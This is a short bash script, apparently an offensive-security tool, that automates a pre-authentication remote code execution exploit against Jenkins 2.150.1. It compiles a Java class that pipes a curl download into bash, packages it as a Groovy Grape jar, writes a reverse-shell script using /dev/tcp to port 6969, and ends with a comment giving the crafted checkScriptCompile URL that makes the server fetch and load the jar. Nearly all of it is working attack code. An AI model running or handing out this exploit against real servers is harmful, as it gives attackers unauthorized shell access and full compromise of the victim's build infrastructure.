#!/bin/bash
#title      : Jenkins v2.150.1 preAuth RCE
#author     : Kashz
#version    : 0.1

echo '[!!] Script assumes you have checked the existence of vuln'
echo '[!!] Admin exists at http://IP:PORT/securityRealm/user/admin/ '

IP="172.16.1.3"
FNAME="kashz"
FVER="111"

cat <<EOF >Orange.java
public class Orange {
    public Orange(){
        try {
            String payload = "curl $IP/bash-me.sh | bash";
            String[] cmds = {"/bin/bash", "-c", payload};
            java.lang.Runtime.getRuntime().exec(cmds);
        } catch (Exception e) { }
    }
}
EOF

javac -target 1.8 -source 1.8 Orange.java

mkdir -p META-INF/services/
echo Orange >META-INF/services/org.codehaus.groovy.plugins.Runners

jar cvf $FNAME-$FVER.jar Orange.class META-INF

mkdir -p tw/orange/$FNAME/$FVER
mv $FNAME-$FVER.jar tw/orange/$FNAME/$FVER

rm Orange.java
rm Orange.class
rm -rf META-INF

cat <<EOF >bash-me.sh
#!/bin/bash
bash -i >& /dev/tcp/$IP/6969 0>&1
EOF
chmod +x bash-me.sh

echo '[!!] Ready to Exploit'
echo '[!!] Check comments in code for URL to go to exploit'

# URL TO GO TO:
# http://IP:PORT/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://IP/%27)%0A@Grab(group=%27tw.orange%27,%20module=%27<MODULE_NAME>%27,%20version=%27<MODULE_VERSION>%27)%0Aimport%20Orange;
